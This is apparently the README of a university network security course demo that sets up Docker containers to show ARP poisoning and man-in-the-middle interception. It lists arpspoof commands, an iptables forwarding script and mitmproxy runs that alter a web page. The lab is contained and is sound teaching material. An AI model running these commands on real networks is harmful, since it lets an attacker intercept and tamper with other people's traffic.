# 🚀 Man-in-the-Middle (MitM) Docker Demo

A simple and lightweight demo showcasing a **Man-in-the-Middle (MitM)** attack via **ARP poisoning** using Docker containers. This project is designed for quick setup, requiring only Docker and `docker-compose`. Everything else is handled by the container configurations.

🔒 **Purpose:**  
This demo was created as part of a Network Security course project.

---

## 🛠 Tools Used
- **Docker**
- **docker-compose**
- **mitmproxy**
- **arpspoof**

---

## 📦 Project Setup
The demo involves three Docker containers connected through a Docker bridge network named `mitm`:

1. **Bob**: Hosts an HTTP server serving files from the `bob_files` directory.  
2. **Alice**: Runs Firefox in a container. Access it from the host at [http://localhost:5800](http://localhost:5800).  
3. **Eve**: The attacker container, used via bash. It has the `eve_files` folder mounted as `/olicyber` inside the container. *(TODO: Rename this folder to a more meaningful name.)*

---

## 🔧 How to Run the Demo

### 1. Set Up the Environment
1. Install **Docker** and **docker-compose**.
2. Start the containers:
   ```bash
   docker-compose up -d

### 2. Verify Initial Setup

- Open **Alice's Firefox** at [http://localhost:5800](http://localhost:5800) and visit [http://bob/](http://bob/).  
  You should see the website served by Bob's HTTP server.  

- Verify Bob's MAC address from Alice's shell:
   ```bash
   docker exec -it mitm_alice /bin/sh
   ip neighbor
### 3. Discover IP Addresses

- On Eve's container, open two bash instances:
   ```bash
   docker exec -it mitm_eve /bin/bash

- Run the dig command to get Alice's and Bob's IP addresses:
    ```bash
   dig alice
   dig bob

### 4. Perform ARP Spoofing

In the two bash instances on Eve's container, run the following commands:
- **Instance 1**:
   ```bash
   arpspoof -t <alice_ip> <bob_ip>
- **Instance 2**:
   ```bash
   arpspoof -t <bob_ip> <alice_ip>
- Check on Alice's shell that Bob's IP now maps to Eve's MAC address:
  ```bash
   ip neighbor
  
## 🔥 Simulating the Attack

### Step 1: Forward Traffic Through Eve
- Run the `add_iptables_rule.sh` script on Eve to forward traffic:
   ```bash
     /olicyber/add_iptables_rule.sh

- Verify that Alice's browser now shows an error when reloading the page. This occurs because packets are being intercepted by Eve but dropped since the proxy is inactive.

### Step 2: Activate the Proxy in Passive Mode

- Start the proxy in passive mode:
   ```bash
   mitmproxy -m transparent

- Reload the page in Alice's browser. The website will load normally, but Eve's mitmproxy instance will display the intercepted requests.

### Step 3: Modify the Webpage

- Restart the proxy with a custom script to alter the website content:
  
  ```bash
   mitmproxy -m transparent -s /olicyber/proxy.py
  
- Reload the browser page, and you'll see the altered website content.

## 🛑 Shutting Down

- Remove the iptables rule:
   ```bash
   /olicyber/del_iptables_rule.sh
   
- Stop the ARP spoofing processes in Eve's bash instances.
